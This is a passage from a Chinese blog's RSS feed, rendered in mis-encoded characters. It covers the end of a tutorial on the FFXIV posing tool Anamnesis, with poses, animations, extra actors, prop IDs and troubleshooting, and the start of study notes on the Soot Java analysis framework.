è½½åŠ¨ä½œã€‚</p><ul><li>å¿…é¡»è¿›å…¥ GPose æ¨¡å¼æ‰èƒ½åŠ è½½åŠ¨ä½œï¼Œæœªè¿›å…¥ GPose æ¨¡å¼æ—¶å°†æ— æ³•ç‚¹å‡»æŒ‰é’®ã€‚</li><li>è¿›å…¥ GPose æ¨¡å¼åå¿…é¡»æš‚åœäººç‰©ï¼Œå¦åˆ™ä¼šå‡ºç°è§’è‰²æ¼‚ç§»çš„æƒ…å†µã€‚</li></ul><p><strong>æ³¨æ„ï¼š</strong>æ­¤æ—¶ GPose æ¨¡å¼ä¸­çš„æš‚åœåŠŸèƒ½ä¸ä¼šæœ‰è¾¹æ¡†ï¼ˆé€‰ä¸­çŠ¶æ€ï¼‰ã€‚</p><img src="https://s2.loli.net/2022/03/25/8qYh4OPCSaxlLeb.jpg" style="zoom:80%;" /><p>å·¦ä¾§é€‰æ‹©éœ€è¦åŠ è½½åŠ¨ä½œçš„è§’è‰²ï¼Œè¿›å…¥éƒ½åŠ¨ä½œé¢æ¿åï¼Œç‚¹å‡»å³ä¸‹è§’çš„è½½å…¥æŒ‰é’®å¼¹å‡ºæµ®å‡ºæ§ä»¶ï¼Œé»˜è®¤ 4 ä¸ªæ–‡ä»¶æºï¼ŒåŒ…å«ç‰¹å®šç±»å‹æ–‡ä»¶çš„é¢„å®šæ–‡ä»¶å¤¹ï¼š</p><ul><li>Anamnesis Poses æ–‡ä»¶å¤¹ï¼šåŒ…å« <code>.pose</code> æ–‡ä»¶</li><li>Anamnesis Built-In Poses æ–‡ä»¶å¤¹ï¼šå†…ç½® <code>.pose</code> æ–‡ä»¶ï¼Œç”± <a href="https://github.com/CapnKett">Capâ€™n Kett</a> æä¾›</li><li>Concept Matrix Pose (Matrix Saves) æ–‡ä»¶å¤¹ï¼šåŒ…å« <code>.cmp</code> æ–‡ä»¶</li><li>Desktopï¼šæ¡Œé¢</li></ul><p>åŒæ ·ï¼Œå°†é¼ æ ‡æ‚¬åœåœ¨å›¾æ ‡ä¸Šå¯ä»¥çœ‹åˆ°ç›¸åº”çš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸‹æ–¹çš„ <code>...</code> è‡ªå®šä¹‰å…¶ä»–æ–‡ä»¶å¤¹ã€‚æµ®å‡ºæ§ä»¶åˆ—å‡ºäº†æ–‡ä»¶å¤¹ä¸­çš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡ä¸Šæ–¹æŒ‰é’®è®¾ç½®æ˜¾ç¤ºæ–¹å¼ï¼ŒAnamnesis Built-In Poses æ–‡ä»¶å¤¹å†…ç½®äº†å¥³æ€§ã€ç”·æ€§ã€ä¸åˆ†æ€§åˆ«çš„åŠ¨ä½œã€‚</p><img src="https://s2.loli.net/2022/03/25/Kbl7WGyB2wZuzQ1.jpg" style="zoom:80%;" /><p>é€‰æ‹©äº†åŠ¨ä½œæ–‡ä»¶ä¹‹åç‚¹å‡»è½½å…¥ï¼Œä½ç½®ä¸å¯¹å¯ä»¥ç”¨å³ä¾§çš„é¢æ¿è°ƒæ•´</p><ul><li>ä¸Šæ–¹æ˜¯äººç‰©é¢å‘çš„ XYZ è½´ï¼Œä¹Ÿå¯ä»¥æ‹–åŠ¨åœ†çƒçš„ä¸‰ç»´è°ƒæ•´</li><li>ä¸‹æ–¹æ˜¯äººç‰©æ¨¡å‹çš„ XYZ è½´</li></ul><img src="https://s2.loli.net/2022/03/25/R1Or8TuhzGWDHfI.jpg" style="zoom:80%;" /><h3 id="åŠ¨ç”»"><a href="#åŠ¨ç”»" class="headerlink" title="åŠ¨ç”»"></a>åŠ¨ç”»</h3><p>è¿›å…¥ GPose æ¨¡å¼å‰åŠ è½½åŠ¨ç”»ï¼Œå¯ä»¥é€‰æ‹©æƒ…æ„ŸåŠ¨ä½œå’Œè¡¨æƒ…ã€‚ï¼ˆä¸Šé¢é‚£å¼ å›¾çš„å³ä¸Šéƒ¨åˆ†ï¼‰</p><ul><li>æœç´¢å›¾æ ‡ï¼šç‚¹å‡»æ‰“å¼€æƒ…æ„ŸåŠ¨ä½œå’Œè¡¨æƒ…åˆ—è¡¨</li><li>æ•°å­—ï¼šç¬¬ä¸€ä¸ªè¡¨ç¤ºåŠ¨ç”» IDï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºå¾ªç¯é—´éš”æ—¶é—´</li><li>æš‚åœå›¾æ ‡</li><li>å¼€å§‹å›¾æ ‡</li><li><code>Draw Weapon</code> æŒæœ‰è£…å¤‡ï¼›<code>Queue Animation</code> é˜Ÿåˆ—åŠ¨ç”»ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªåŠ¨ç”»åˆ™ç«‹å³å¼€å§‹</li><li><code>Idle Character</code> æ¢å¤å¾…æœºåŠ¨ä½œï¼›<code>Reset Animation</code> æ”¶èµ·æ­¦å™¨&#x2F;æš‚åœåŠ¨ç”»</li></ul><img src="https://s2.loli.net/2022/03/25/oe7IFBsMGbuPSVz.jpg" style="zoom:80%;" /><p>åŠ è½½åŠ¨ç”»åï¼Œå¯ä»¥è¿›å…¥ GPose æ¨¡å¼å¼€å¯åŠ¨ä½œå¾ªç¯ï¼Œç„¶åå°±å¯ä»¥ä»»æ„æš‚åœç›®æ ‡åŠ¨ä½œå¼€å§‹æˆªå›¾äº†ã€‚ï¼ˆä»€ä¹ˆå¥‡å¥‡æ€ªæ€ªçš„ç™¾ä¸‡æ ¸çˆ†æˆªå›¾ğŸ˜‚ï¼‰</p><img src="https://s2.loli.net/2022/03/25/oq1sMzx8fQdmkVt.jpg" style="zoom:80%;" /><p>æ¸¸æˆä¸­çš„åŠ¨ç”»åˆ—è¡¨å¯ä»¥åœ¨ <a href="https://docs.google.com/spreadsheets/d/1nkmqfhP7FZJwmM26o69fq5pgHZsgk9Zvxr0hUUVkL48/edit#gid=526398191">è¿™é‡Œ</a> æŸ¥çœ‹ã€‚</p><p><strong>TIPSï¼š</strong></p><ol><li>æ…¢é€Ÿæ’­æ”¾ï¼šåœ¨ GPose æ¨¡å¼ä¸­å¯ç”¨ç¡çœ çŠ¶æ€ï¼Œå¯ä»¥å°†æ­£åœ¨æ‰§è¡Œçš„åŠ¨ä½œ&#x2F;è¡¨æƒ…å‡æ…¢åˆ°æ­£å¸¸é€Ÿåº¦çš„ 1&#x2F;4ï¼Œä½†åªèƒ½åº”ç”¨äºç©å®¶ã€åŒä¼´å’Œå® ç‰©ã€‚</li><li>åˆ†å±‚åŠ¨ç”»ï¼šå…ˆåº”ç”¨ä¸€ä¸ªæ”¹å˜çŠ¶æ€çš„åŠ¨ç”»ï¼Œç„¶åå†åº”ç”¨ä¸€ä¸ªå…¼å®¹çš„åŠ¨ç”»ã€‚ä¾‹å¦‚ï¼Œå…ˆç”¨åŠ¨ç”» 642 åä¸‹ï¼Œç„¶ååº”ç”¨ä¸Šèº«æŒ¥åŠ¨çš„åŠ¨ç”» 681 å®ç°åç€æŒ¥æ‰‹ã€‚<ul><li>æ¸¸æˆæœ¬èº«å¯ä»¥å®ç°ï¼Œè¿˜æ²¡æ€ä¹ˆç”¨è¿‡ğŸ˜¶</li></ul></li></ol><h1 id="æ·»åŠ é¢å¤–æ¼”å‘˜"><a href="#æ·»åŠ é¢å¤–æ¼”å‘˜" class="headerlink" title="æ·»åŠ é¢å¤–æ¼”å‘˜"></a>æ·»åŠ é¢å¤–æ¼”å‘˜</h1><p>å¯ä»¥å°†å„ç§å®ä½“æ”¹ä¸ºé¢å¤–çš„æ¼”å‘˜ï¼Œè€Œä¸ç”¨å€ŸåŠ©å…¶ä»–ç©å®¶ã€‚å­¤ç‹¼ç©å®¶çš„ç¦éŸ³ï¼ˆä¸æ˜¯</p><h2 id="å¬å”¤å…½"><a href="#å¬å”¤å…½" class="headerlink" title="å¬å”¤å…½"></a>å¬å”¤å…½</h2><p>æœ€å¥½ç”¨å®çŸ³å…½ï¼Œå…¶ä»–çš„ç¼©æ”¾æ¯”ä¾‹å¯èƒ½ä¸æ­£ç¡®ï¼Œè€Œä¸”ä¼šæµ®ç©ºã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯æ‘˜æ‰èŒä¸šæ°´æ™¶ï¼Œç”¨ç§˜æœ¯å¸ˆçš„æŠ€èƒ½ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°†å¬å”¤å…½å…¨éƒ¨æ›¿æ¢ä¸ºå®çŸ³å…½ã€‚</p><p>ä¸ºäº†å°†å®çŸ³å…½å˜æˆå¯ç¼–è¾‘çš„æ¼”å‘˜ï¼Œéœ€è¦é€‰ä¸­å®çŸ³å…½åï¼Œç‚¹å‡» Anamnesis å·¦ä¾§çš„ <code>+</code> æŒ‰é’®æ·»åŠ ã€‚</p><img src="https://s2.loli.net/2022/03/25/v6NTMFonid3z8K5.jpg" style="zoom:80%;" /><p>ç„¶åå¯ä»¥å°†å¤–è§‚åŠ è½½åˆ°å®çŸ³å…½ä¸Šï¼Œç‚¹å‡»å³ä¸‹è§’çš„åŠ è½½æˆ– NPC è¿›è¡ŒåŠ è½½ã€‚</p><img src="https://s2.loli.net/2022/03/25/RBAhNtMTyiql36j.jpg" style="zoom:80%;" /><p>ä¾‹å¦‚ï¼ŒæŠŠé›…ä¿®ç‰¹æ‹‰åŠ è½½åˆ°å®çŸ³å…½ä¸Šã€‚</p><img src="https://s2.loli.net/2022/03/25/2Cic7XlsTUafbYS.jpg" style="zoom:80%;" /><p>è½¬æ¢èŒä¸šåï¼Œä¼šæ”¶èµ·å®çŸ³å…½ï¼ˆè‡ªåŠ¨æ’­æ”¾æ­»äº¡åŠ¨ç”»ï¼‰ã€‚</p><h2 id="æˆ¿å±‹-NPC-æˆ–äººä½“æ¨¡å‹"><a href="#æˆ¿å±‹-NPC-æˆ–äººä½“æ¨¡å‹" class="headerlink" title="æˆ¿å±‹ NPC æˆ–äººä½“æ¨¡å‹"></a>æˆ¿å±‹ NPC æˆ–äººä½“æ¨¡å‹</h2><p>å’Œå¬å”¤å…½ä¸€æ ·ï¼Œç‚¹å‡» Anamnesis å·¦ä¾§çš„ <code>+</code> æŒ‰é’®æ·»åŠ ï¼Œç„¶åå°†å¤–è§‚åŠ è½½åˆ°ä»–ä»¬èº«ä¸Šã€‚</p><h2 id="é™†è¡Œé¸Ÿ"><a href="#é™†è¡Œé¸Ÿ" class="headerlink" title="é™†è¡Œé¸Ÿ"></a>é™†è¡Œé¸Ÿ</h2><p>å¤§è‡´å’Œå¬å”¤å…½ç›¸åŒï¼Œä½†éœ€è¦é¢å¤–åœ¨åŠ¨ä½œé€‰é¡¹å¡ä¸­å°†æ¯ä¸ªè½´ä¸Šçš„æ¯”ä¾‹é‡ç½®ä¸º 1ã€‚</p><h2 id="å°é˜Ÿæˆå‘˜"><a href="#å°é˜Ÿæˆå‘˜" class="headerlink" title="å°é˜Ÿæˆå‘˜"></a>å°é˜Ÿæˆå‘˜</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå°é˜Ÿæˆå‘˜éƒ½è¢«æ ‡è®°ä¸ºç©å®¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œç¼–è¾‘å’Œæ‘†æ”¾ã€‚</p><h2 id="å® ç‰©"><a href="#å® ç‰©" class="headerlink" title="å® ç‰©"></a>å® ç‰©</h2><p>å¯ä»¥è½¬æ¢ä¸º NPCï¼Œä½†æ˜¯è‡ªä¸»è¡ŒåŠ¨çš„ä¼šè‡ªå·±è·‘â€¦â€¦</p><img src="https://s2.loli.net/2022/03/25/aUmZj16CNlKfcbW.jpg" style="zoom:80%;" /><h2 id="é“å…·"><a href="#é“å…·" class="headerlink" title="é“å…·"></a>é“å…·</h2><h3 id="æ¸¸æˆèµ„æº"><a href="#æ¸¸æˆèµ„æº" class="headerlink" title="æ¸¸æˆèµ„æº"></a>æ¸¸æˆèµ„æº</h3><p>è§’è‰²ï¼ˆæ¼”å‘˜ï¼‰åœ¨è¿‡åœºåŠ¨ç”»ä¸­ä½¿ç”¨çš„ã€åœ¨æƒ…æ„ŸåŠ¨ä½œ&#x2F;è¡¨æƒ…ä¸­ä½¿ç”¨çš„å„ç§é“å…·å¯åœ¨è£…å¤‡éƒ¨åˆ†ç”¨ä½œæ­¦å™¨çš„æ›¿ä»£ã€‚ä»ä¸»æ‰‹æˆ–å‰¯æ‰‹çš„æ­¦å™¨åˆ—è¡¨ä¸­é€‰æ‹©ç›¸åº”çš„é“å…·è£…å¤‡å³å¯ã€‚</p><p>é“å…·åˆ—è¡¨æ˜¯äººå·¥ç»´æŠ¤çš„ï¼Œå› æ­¤æœ‰äº›é“å…·å¯èƒ½ä¸ä¼šå‡ºç°åœ¨åˆ—è¡¨ä¸­ã€‚</p><h3 id="å·²ä¿®æ”¹çš„é“å…·"><a href="#å·²ä¿®æ”¹çš„é“å…·" class="headerlink" title="å·²ä¿®æ”¹çš„é“å…·"></a>å·²ä¿®æ”¹çš„é“å…·</h3><p>è¢« TexTools ä¿®æ”¹è¿‡çš„å®ä½“ã€‚</p><h3 id="æ—¶å°šé…é¥°"><a href="#æ—¶å°šé…é¥°" class="headerlink" title="æ—¶å°šé…é¥°"></a>æ—¶å°šé…é¥°</h3><p>å¯ä»¥åƒæ•ˆæœä¸€æ ·åŠ è½½ï¼Œä½†å¿…é¡»æ‰‹åŠ¨è¾“å…¥æ¨¡å‹ IDã€‚åœ¨åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªè§’è‰²ï¼Œç„¶ååœ¨è§’è‰²éƒ¨åˆ†è¾“å…¥ç›¸å…³çš„æ¨¡å‹ ID æ‰‹åŠ¨æ›´æ”¹å¤–è§‚ã€‚</p><table><thead><tr><th>é¥°å“</th><th>Accessory</th><th>ID</th></tr></thead><tbody><tr><td>é˜³ä¼</td><td>Parasol</td><td>2939</td></tr><tr><td>å¤©è“é˜³ä¼</td><td>Sky Blue Parasol</td><td>2940</td></tr><tr><td>çº¢æ¼†æ²¹çº¸ä¼</td><td>Vermilion Paper Parasol</td><td>3007</td></tr><tr><td>ç´«æ¼†æ²¹çº¸ä¼</td><td>Plum Paper Parasol</td><td>3008</td></tr><tr><td>é»„æ¼†æ²¹çº¸ä¼</td><td>Gold Paper Parasol</td><td>3009</td></tr><tr><td>æ²‰ç¨³æ–¹æ ¼é˜³ä¼</td><td>Calming Checkered Parasol</td><td>3010</td></tr><tr><td>æ´»åŠ›æ–¹æ ¼é˜³ä¼</td><td>Cheerful Checkered Parasol</td><td>3011</td></tr><tr><td>å…¸é›…æ–¹æ ¼é˜³ä¼</td><td>Classy Checkered Parasol</td><td>3012</td></tr><tr><td>å¤©ä½¿ä¹‹ç¿¼</td><td>Angel Wings</td><td>3042</td></tr><tr><td>è¶£å‘³åœ†ç‚¹é˜³ä¼</td><td>Pleasant Dot Parasol</td><td>3166</td></tr><tr><td>ç«¯åº„åœ†ç‚¹é˜³ä¼</td><td>Prim Dot Parasol</td><td>3167</td></tr><tr><td>ç”°å›­åœ†ç‚¹é˜³ä¼</td><td>Pastoral Dot Parasol</td><td>3168</td></tr><tr><td>é‡‘è¶é˜³ä¼</td><td>Gold Parasaucer</td><td>3169</td></tr><tr><td>çŒ«å°èƒ–é˜³ä¼</td><td>Fat Cat Parasol</td><td>3286</td></tr><tr><td>éš†å¡çš„æ°´è›‡ä¼ï¼Ÿ</td><td>Great Paraserpent</td><td>3287</td></tr><tr><td>çº¢æœˆæ²¹çº¸ä¼</td><td>Red Moon Parasol</td><td>3288</td></tr></tbody></table><p>ä¾‹å¦‚ï¼Œå°†è§’è‰²è½¬æ¢ä¸ºé˜³ä¼ï¼š</p><img src="https://s2.loli.net/2022/03/25/U1gpbmzSMhyserG.jpg" style="zoom:80%;" /><h1 id="pose-åŠ¨ä½œæ–‡ä»¶"><a href="#pose-åŠ¨ä½œæ–‡ä»¶" class="headerlink" title=".pose åŠ¨ä½œæ–‡ä»¶"></a><code>.pose</code> åŠ¨ä½œæ–‡ä»¶</h1><h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p>å› ä¸º Anamnesis æ—¢æ”¯æŒ <code>.cmp</code> åˆæ”¯æŒ <code>.pose</code>ï¼Œå› æ­¤å¯ä»¥åœ¨ <a href="https://www.xivmodarchive.com/search?sortby=rank&sortorder=desc&nsfw=false&types=11,13">XIV Mod Archive</a> ä¸ŠæŒ‰æ–‡ä»¶æ ¼å¼è¿‡æ»¤æœç´¢ã€‚</p><img src="https://s2.loli.net/2022/03/25/2CxFVqjkdOEhQ85.png" style="zoom:67%;" /><p>å¦å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Discord åŠ å…¥ <a href="https://discord.com/invite/crystallinemeans">Crystalline Means é¢‘é“</a>ï¼Œç„¶åæŸ¥çœ‹å¹¶ä¸‹è½½ POSE RELEASES åˆ†åŒºä¸­çš„å†…å®¹ã€‚</p><img src="https://s2.loli.net/2022/03/25/4xvflQbkjDUdG9e.jpg" style="zoom:70%;" /><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><ol><li>ä¸‹è½½åŠ¨ä½œï¼š<a href="https://www.xivmodarchive.com/modid/43260">Stronzo Set I</a>ï¼ˆä¸åˆ†æ€§åˆ«ï¼‰</li><li>è¿›å…¥ GPose æ¨¡å¼æš‚åœåŠ¨ä½œ</li><li>å¼€å¯ Posing mode</li><li>åŠ è½½ <code>.pose</code> åŠ¨ä½œ</li><li>æŒ‰éœ€è°ƒæ•´æ¨¡å‹ XYZ è½´</li></ol><img src="https://s2.loli.net/2022/03/25/X8WHJ9kAUu6rj1Y.jpg" style="zoom:80%;" /><h1 id="é—®é¢˜ä¸è§£å†³"><a href="#é—®é¢˜ä¸è§£å†³" class="headerlink" title="é—®é¢˜ä¸è§£å†³"></a>é—®é¢˜ä¸è§£å†³</h1><ol><li><p><strong>æ— æ³•å¯åŠ¨ Anamnesis</strong></p><p>é¦–å…ˆç¡®ä¿å®‰è£…äº† <a href="https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-6.0.6-windows-x64-installer">.NET 6.0 Desktop Runtime x64</a> æˆ–æ›´é«˜ç‰ˆæœ¬çš„è¿è¡Œæ—¶ï¼Œå¦‚æœåˆšå®‰è£…éœ€è¦é‡å¯ã€‚</p><p>å¦å¤–ï¼Œå¯èƒ½æ˜¯ç”µè„‘ç®¡å®¶ç»™æ‹¦æˆªäº†ï¼Œå¯ä»¥å°è¯•å…³é—­ç”µè„‘ç®¡å®¶åé‡å¯ Anamnesisï¼Œæˆ–å°† Anamnesis æ·»åŠ åˆ°ç™½åå•ï¼Œå…·ä½“æ“ä½œæ ¹æ®ç”µè„‘ç®¡å®¶çš„ä¸åŒæœ‰æ‰€å‡ºå…¥ï¼Œè¯·è‡ªè¡Œæœç´¢ç›¸å…³æ“ä½œæ–¹æ³•ã€‚</p><p><code>Failed to initialize Lumina</code> å¯èƒ½æ˜¯å®‰è£…çš„ Anamnesis ç‰ˆæœ¬ä¸å¯¹ï¼Œå›½é™…æœè¯·ä½¿ç”¨æœ€æ–°ç‰ˆï¼Œå›½æœè¯·ä½¿ç”¨æœ¬æ–‡å¼€å¤´æ¨èçš„ç‰ˆæœ¬ï¼Œå›½æœåœ¨å¯åŠ¨è½¯ä»¶æ—¶è¯·ç‚¹å‡» Skip è·³è¿‡æ›´æ–°ï¼š</p><img src="https://s2.loli.net/2023/08/29/RDgzl4fKn5PQtmH.png" style="zoom: 80%;" /></li><li><p><strong>è§’è‰²ä¸æ‰§è¡ŒåŠ¨ç”»æˆ–åŸåœ°æŠ–åŠ¨</strong></p><p>å¯èƒ½çš„åŸå› æœ‰ï¼š1. åœ¨ GPose æ¨¡å¼ä¸­æš‚åœäº†äººç‰©ï¼Œæˆ–åœ¨ Anamnesis ä¸­å¯ç”¨äº†åŠ¨ä½œæ¨¡å¼ï¼›2. æŠŠä¸¤ä¸ªä¸å…¼å®¹çš„åŠ¨ç”»å åŠ åœ¨ä¸€èµ·ä½¿ç”¨ï¼›3. åŠ¨ç”»å’Œè§’è‰²ä¸å…¼å®¹ï¼Œæœ‰äº›åŠ¨ç”»æ˜¯ç§æ—æˆ–æ­¦å™¨ç‰¹å®šçš„ã€‚</p></li><li><p><strong>è®¾ç½®æœªæ­£ç¡®ä¿å­˜ï¼Œè®¾ç½®æ–‡ä»¶æŸåï¼Œæˆ–æƒ³é‡ç½® Anamnesis</strong></p><p>å¯åŠ¨ Anamnesis æ—¶æŒ‰ä½ <code>Shift</code>ï¼Œç›´åˆ°å‡ºç°ä»¥ä¸‹å¯¹è¯çª—å£ï¼š</p><img src="https://s2.loli.net/2022/03/25/7GAByIUQqgfnctY.jpg" style="zoom: 80%;" /></li><li><p><strong>æ— æ³•åœ¨åéª‘ä¸Šæ‘†åŠ¨ä½œ</strong></p><p>çœ‹ Wiki è¯´æ˜¯åªèƒ½ç”¨ç¬¬äºŒä¸ªè§’è‰²ï¼ˆæ¼”å‘˜ï¼‰ï¼Œå°†å…¶æ›´æ”¹ä¸ºåéª‘ã€‚</p></li><li><p><strong>è£…å¤‡æ— æ³•æŸ“è‰²</strong></p><p>æœ‰äº›è£…å¤‡å°±æ˜¯ä¸èƒ½æŸ“è‰²ï¼Œæƒ³æ”¹çš„è¯è¯·ç”¨ TexTools ğŸ‘‰<a href="https://jckling.github.io/2021/04/29/Game/FFXIV/FF14-TexTool%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">FF14 TexTools ä½¿ç”¨æ•™ç¨‹</a></p></li><li><p><strong>é€€å‡º GPose æ¨¡å¼åä»ç„¶å¤„äºå†»ç»“çŠ¶æ€</strong></p><p>å¯ä»¥å°è¯•å…³é—­ Anamnesis æˆ–åˆ‡æ¢å‰¯æœ¬åŒºã€‚</p></li><li><p><strong>æ²¡æœ‰ä¿å­˜è§’è‰²æ•°æ®å’ŒåŠ¨ä½œæ•°æ®çš„æ–‡ä»¶å¤¹</strong></p><p>æ‰§è¡Œä¿å­˜æ“ä½œåæ‰ä¼šåˆ›å»ºç›¸åº”çš„æ–‡ä»¶å¤¹ã€‚</p></li><li><p><strong>äººç‰©åœ¨ GPose æ¨¡å¼ä¸­æ— æ³•åŠ è½½åŠ¨ä½œ</strong></p><p>é€€å‡º GPose æ¨¡å¼åé‡æ–°è¿›å…¥ï¼Œå…ˆæš‚åœäººç‰©ï¼Œå†å¼€å¯ Posing mode åŠ è½½åŠ¨ä½œã€‚</p></li><li><p><strong>æ¸¸æˆå‡ºé”™å´©æºƒ</strong></p><p>åœ¨å››äººæœ¬çš„æ—¶å€™å¤šæ¬¡æ›¿æ¢ä¸Šè¡£ï¼Œå¯¼è‡´æ¸¸æˆå´©æºƒã€‚ä¸å»ºè®®åœ¨å‰¯æœ¬é‡Œé¢‘ç¹ä½¿ç”¨ã€‚</p></li><li><p><strong>åŠ è½½ NPC æ¨¡å‹åè¿›å…¥ Gpose æ˜¾ç¤ºé»˜è®¤æ¨¡å‹</strong><br>   å¯ä»¥åŠ è½½åˆ°å®çŸ³å…½ã€é™†è¡Œé¸Ÿä¸Šï¼Œæˆ–åŠ è½½åˆ°è§’è‰²ä¸Šå†ç”¨ CMTool ä¿å­˜ã€‚</p></li></ol><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li><a href="https://github.com/imchillin/Anamnesis">imchillin&#x2F;Anamnesis</a></li><li><a href="https://github.com/imchillin/Anamnesis/wiki">Anamnesis Wiki</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Game/">Game</category>
      
      
      <category domain="https://jckling.github.io/tags/FFXIV/">FFXIV</category>
      
      
      <comments>https://jckling.github.io/2022/03/23/Game/FFXIV/FF14-Anamnesis%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Soot ä½¿ç”¨è®°å½•</title>
      <link>https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
      <guid>https://jckling.github.io/2022/02/23/Other/Soot%20%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
      <pubDate>Wed, 23 Feb 2022 11:40:17 GMT</pubDate>
      
      <description>Soot çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•åŠæ³¨æ„ç‚¹</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸ºäº†é¿å…æ¯æ¬¡éƒ½è¦æ‰“å¼€ä¸€å †é¡¹ç›®å›é¡¾ï¼Œç¨å¾®è®°å½•ä¸€äº›å†…å®¹ã€‚</p><h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><img src="https://s2.loli.net/2022/03/08/wL3laGWBCUg4hmI.jpg" style="zoom: 67%;" /><p>Sceneï¼šåˆ†æç¯å¢ƒ</p><ul><li>ä»£è¡¨ Soot è¾“å…¥ç¨‹åºçš„æ•´ä¸ªè¿è¡Œã€åˆ†æã€å˜æ¢çš„ç¯å¢ƒã€‚</li></ul><p>SootClassï¼šç±»</p><ul><li>library ç±»æ¥è‡ª Soot çš„ classpathï¼Œä½†åªåœ¨éœ€è¦æ—¶åŠ è½½ï¼›</li><li>application åºç±»æ˜¯ä»è¿›ç¨‹ç›®å½•ä¸­è·å–çš„ï¼Œå¹¶ä¸”æ€»æ˜¯è¢«åŠ è½½å’Œè½¬æ¢ï¼›</li><li>phantom ç±»æ˜¯æ—¢ä¸åœ¨è¿›ç¨‹ç›®å½•ä¸­ä¹Ÿä¸åœ¨ Soot çš„ classpath ä¸­çš„ç±»ï¼Œä½†å®ƒä»¬è¢« Soot åŠ è½½çš„ä¸€äº›ç±»&#x2F;æ–¹æ³•ä½“æ‰€å¼•ç”¨<ul><li>å¦‚æœå¯ç”¨äº† phantom ç±»ï¼ŒSoot ä¸ä¼šå› ä¸ºè¿™ç§æ— æ³•è§£å†³çš„å¼•ç”¨è€Œä¸­æ­¢æˆ–å¤±è´¥ï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ªç©ºçš„å­˜æ ¹ï¼Œç§°ä¸º phantom ç±»ï¼Œå®ƒåŒ…å« phantom æ–¹æ³•æ¥å¼¥è¡¥ç¼ºå¤±çš„éƒ¨åˆ†ã€‚</li></ul></li></ul><p>SootMethodï¼šç±»ä¸­çš„å•ä¸ªæ–¹æ³•</p><img src="https://s2.loli.net/2022/03/08/iBpeRNHVOQh49KX.jpg" style="zoom:25%;" /><p>SootFieldï¼šç±»ä¸­çš„å•ä¸ªå±æ€§</p><p>Bodyï¼šæ–¹æ³•ä½“</p><ul><li>ç”± Locals é“¾ï¼ˆbody.getLoclas()ï¼‰ã€Units é“¾ï¼ˆbody.getUnits()ï¼‰ã€Traps é“¾ï¼ˆbody.getTraps()ï¼‰ç»„æˆã€‚</li><li>Locals é“¾å­˜å‚¨æ–¹æ³•ä¸­çš„å˜é‡å®šä¹‰</li><li>Units é“¾å­˜å‚¨æ–¹æ³•ä¸­çš„å¥å­</li><li>Traps é“¾å­˜å‚¨æ–¹æ³•ä¸­å‘ç”Ÿå¼‚å¸¸çš„è¯­å¥</li></ul><p>Boxï¼šæŒ‡é’ˆ</p><ul><li>åŒ…æ‹¬ UnitBoxã€ValueBox</li><li>ä¸€ä¸ª Unit å¯ä»¥æœ‰å¤šä¸ª UnitBoxï¼Œä½†æ˜¯æ¯ä¸ª UnitBox åªèƒ½æŒ‡å‘ä¸€ä¸ª Unitã€‚</li><li>ValueBox åŒ…å«åœ¨ Unit ä¸­ä½¿ç”¨çš„å€¼ä»¥åŠå®šä¹‰çš„å€¼ã€‚</li></ul><p>Stmt ä¸ Unit éƒ½è¡¨ç¤ºæ–¹æ³•ä¸­çš„ä¸€ä¸ªå¥å­ã€‚</p><ul><li>Unit åœ¨ Jimple ä¸­çš„å®ç°æ˜¯ Stmt</li><li>ä¸åŒï¼šUnit æ³¨é‡äºå¥å­çš„æ„æˆã€è€Œ AssignStmt ä¹‹ç±»çš„åˆ™æ³¨é‡å¥å¼çš„ç§ç±»</li><li>æ³¨æ„ï¼šAssignStmt è¡¨ç¤ºèµ‹å€¼è¯­å¥ï¼›è€Œ IdentityStmt è¡¨ç¤ºå°†å‚æ•°èµ‹å€¼ç»™ Local è¿™æ ·çš„è¯­å¥</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸€èˆ¬ Value æŒ‡çš„æ˜¯ Localï¼ˆå˜é‡ï¼‰ã€Exprï¼ˆè¡¨è¾¾å¼ï¼‰ã€Constantï¼ˆå¸¸é‡ï¼‰</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title function_">getUseBoxes</span><span class="params">()</span>;<span class="comment">//è¿”å› Unit ä¸­ä½¿ç”¨çš„ Value 